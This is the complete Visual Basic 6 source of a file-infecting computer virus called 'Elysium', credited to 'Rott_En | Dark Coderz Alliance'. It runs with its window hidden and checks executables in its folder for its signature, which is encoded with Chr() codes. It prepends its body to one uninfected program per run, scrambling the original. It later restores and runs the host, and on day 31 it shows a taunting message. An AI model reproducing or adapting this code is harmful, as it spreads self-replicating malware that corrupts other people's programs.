   VERSION 5.00
   Begin VB.Form frmMain
      BorderStyle     =   0  'None
      ClientHeight    =   90
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   90
      Icon            =   "frmMain.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   90
      ScaleWidth      =   90
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
   End
   Attribute VB_Name = "frmMain"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   '======================================================
   '|  Elysium                                           |
   '|  Rott_En | Dark Coderz Alliance                    |
   '|  Infect one executable per run in curent directory |
   '|  Slow infection method                             |
   '======================================================
   Option Explicit
   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
   Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Private XfileX As Long
   Private HIM As Long
   Private KillIt As Long
   Const a0a1a0a1 As Long = &H103
   Const b1b0b1b0 As Long = &H1F0FFF
   Public MePath As String
   Public Host As String
   Const ElysiumSig = "Elysium Virus by Rott_En/DCA"
   Dim a, b, c, d, e, f, q, x, z, txt, txt2

   Private Sub Form_Load()
   On Error Resume Next
   Dim hpath As String
   Dim lenght As String
   Dim cerberi, genom
   Dim tmpsig, tmpsign, chk As String
   App.TaskVisible = False
   MePath = App.Path
   If Right(MePath, 1) <> "\" Then MePath = MePath & "\"
   Host = Dir$(MePath & "*.exe")
   While Host <> ""
   hpath = hpath & Host & "/"
   Host = Dir$
   Wend
   cerberi = Split(hpath, "/")
   For Each genom In cerberi
   Open MePath & genom For Binary Access Read As #1
   lenght = (LOF(1))
   tmpsig = Space(lenght)
   Get #1, , tmpsign
   Close #1
   chk = Right(tmpsign, 28)
   If chk <> Chr(69) + Chr(108) + Chr(121) + Chr(115) + Chr(105) + Chr(117) + Chr(109) + Chr(32) + Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(82) + Chr(111) + Chr(116) + Chr(116) + Chr(95) + Chr(69) + Chr(110) + Chr(47) + Chr(68) + Chr(67) + Chr(65) Then
   GoTo unholyfile
   Else
   GoTo holyfile
   End If
   unholyfile:
   Bless (MePath & genom)
   Exit For
   holyfile:
   Next genom
   Resurrect (MePath & App.EXEName & ".exe")
   End Sub

   Function Bless(file As String)
   On Error Resume Next
   Dim filebyte1 As String
   Dim ElysiumLen1 As String
   Dim scrambleh As String
   MePath = App.Path
   If Right(MePath, 1) <> "\" Then MePath = MePath & "\"
   Open file For Binary Access Read As #1
   filebyte1 = Space(LOF(1))
   Get #1, , filebyte1
   Close #1
   Open MePath & App.EXEName & ".exe" For Binary Access Read As #2
   ElysiumLen1 = Space(32768)
   Get #2, , ElysiumLen1
   Close #2
   scrambleh = Encrypt(filebyte1)
   Open file For Binary Access Write As #3
   Put #3, , ElysiumLen1
   Put #3, , scrambleh
   Put #3, , ElysiumSig
   Close #3
   End Function

   Function Resurrect(file As String)
   On Error Resume Next
   Dim filebyte2 As String
   Dim ElysiumLen2 As String
   Dim descrambleh As String
   MePath = App.Path
   If Right(MePath, 1) <> "\" Then MePath = MePath & "\"
   Open file For Binary Access Read As #1
   ElysiumLen2 = Space(10752)
   filebyte2 = Space(LOF(1) - 10752)
   Get #1, , filebyte2
   Get #1, , ElysiumLen2
   Close #1
   descrambleh = Decrypt(filebyte2)
   Open MePath & Chr(101) + Chr(108) + Chr(121) + Chr(115) + Chr(105) + Chr(117) + Chr(109) + Chr(46) + Chr(99) + Chr(111) + Chr(109) For Binary Access Write As #2
   Put #2, , descrambleh
   Close #2
   HIM = Shell(MePath & Chr(101) + Chr(108) + Chr(121) + Chr(115) + Chr(105) + Chr(117) + Chr(109) + Chr(46) + Chr(99) + Chr(111) + Chr(109), vbNormalFocus)
   XfileX = OpenProcess(b1b0b1b0, False, HIM)
   GetExitCodeProcess XfileX, KillIt
   Do While KillIt = a0a1a0a1
   DoEvents
   GetExitCodeProcess XfileX, KillIt
   Loop
   Kill MePath & Chr(101) + Chr(108) + Chr(121) + Chr(115) + Chr(105) + Chr(117) + Chr(109) + Chr(46) + Chr(99) + Chr(111) + Chr(109)
   Call ChkPayload
   End Function

   Function Encrypt(code)
   q = ""
   a = RandomNumber(9) + 32
   b = RandomNumber(9) + 32
   c = RandomNumber(9) + 32
   d = RandomNumber(9) + 32
   q = Chr(a) & Chr(b) & Chr(c)
   e = 1

   For x = 1 To Len(code)
   f = Mid(code, x, 1)
   If e = 1 Then q = q & Chr(Asc(f) + a)
   If e = 2 Then q = q & Chr(Asc(f) + b)
   If e = 3 Then q = q & Chr(Asc(f) + c)
   If e = 4 Then q = q & Chr(Asc(f) + d)
   e = e + 1
   If e > 4 Then e = 1
   Next x
   q = q & Chr(d)
   Encrypt = q
   End Function

   Function Decrypt(code)
   q = ""
   z = Left(code, 3)
   a = Left(z, 1)
   b = Mid(z, 2, 1)
   c = Mid(z, 3, 1)
   d = Right(code, 1)
   a = Int(Asc(a)) 'key1
   b = Int(Asc(b)) 'key2
   c = Int(Asc(c)) 'key3
   d = Int(Asc(d)) 'key4
   txt = Left(code, Len(code) - 1)
   txt2 = Mid(txt, 4, Len(txt))

   For x = 1 To Len(txt2)
   f = Mid(txt2, x, 1)
   If e = 1 Then q = q & Chr(Asc(f) - a)
   If e = 2 Then q = q & Chr(Asc(f) - b)
   If e = 3 Then q = q & Chr(Asc(f) - c)
   If e = 4 Then q = q & Chr(Asc(f) - d)
   e = e + 1
   If e > 4 Then e = 1
   Next x
   Decrypt = q
   End Function

   Function RandomNumber(number)
   Randomize
   RandomNumber = Int((Val(number) * Rnd) + 1)
   End Function

   Sub ChkPayload()
   If Day(Now) > 30 Then
   MsgBox "You can stop this individual, but you cant stop us all!", vbInformation, "Elysium"
   Else
   End If
   End Sub

   '======================================================
   '|  Elysium                                           |
   '|  Rott_En | Dark Coderz Alliance                    |
   '|  Infect one executable per run in curent directory |
   '|  Slow infection method                             |
   '======================================================
